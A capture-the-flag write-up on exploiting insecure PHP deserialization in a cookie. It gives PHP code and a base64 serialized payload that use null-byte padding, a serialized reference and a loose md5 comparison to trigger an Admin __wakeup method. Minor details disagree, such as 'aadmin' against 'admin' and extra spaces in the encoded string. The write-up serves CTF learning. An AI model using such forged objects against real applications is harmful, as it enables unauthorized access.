# Lerdof's Records

We can see that we are dealing with a php challenge from the question.
The source code of `index.php` is leaked in `index.phps`

`index.phps` includes a file called `classes.php`, whose source code is also leaked.
Observing both these files and the cookies that are set, which is a base64 encoded serialized string, we realise that this is a `Insecure Deserialization` vulnerability.

We can assume that the cookie that is getting set is getting base_64 decoded and then deserialized later in the server.
We see that there is a `__wakeup()` magic method in `Admin` class. 
```php
function __wakeup(){
    if(strlen($this->name) == 10 &&
    strcmp($this->name, "admin") &&
    $this->secret1 === $this->secret2 &&
    md5($this->secret2->key) == 23) {
    print FLAG;
    }
}
```
When our cookie gets deserialized and it creates an `Admin` object, this `__wakeup` function will be called.

Hence, we can create an `Admin` object, with name: `aadmin\0\0\0\0\0` as `strcmp()` compares only till null byte and `strlen()` counts all the bytes, using a `Validate` class for creating `secret1` and `secret2` like 
```php
class Validate{
  public $key = 'r44TdI0STt';
}

class Admin{
  public $name;
  public $secret1;
  public $secret2;

  function __construct($name, $secret1, $secret2) {
    $this->name = $name;
    $this->secret1 = $secret1;
    $this->secret2 = $secret2;
  
  }

}

print_r(base64_encode(serialize(new Admin("admin\0\0\0\0\0", new Validate, new Validate)))); # use actual null bytes instead of \0
```
But to get past the check that checks if `secret1 === secret2`, we use `R` in the serialized string like 
>`O:5:"Admin":3:{s:4:"name";s:10:"admin\0\0\0\0\0";s:7:"secret1";O:8:"Validate":1:{s:3:"key";s:10:"r44TdI0STt";}s:7:"secret2";R:3;}` 

and then base64_encode this to get
>`Tzo1OiJBZG1pbiI6Mzp7czo0OiJuYW1lIjtzOjEwOiJhZG1pbgAAAAAAIjtzOjc6InNlY3JldDEiO086ODoiVmFsaWRhdGUiOjE6ICAge3M6Mzoia2V5IjtzOjEwOiJyNDRUZEkwU1R0Ijt9czo3OiJzZWNyZXQyIjtSOjM7fQ==`

and put it in the cookie to get the flag,

```
p_ctf{t83r35_n07hin6_l1k3_600d_p8p}
```
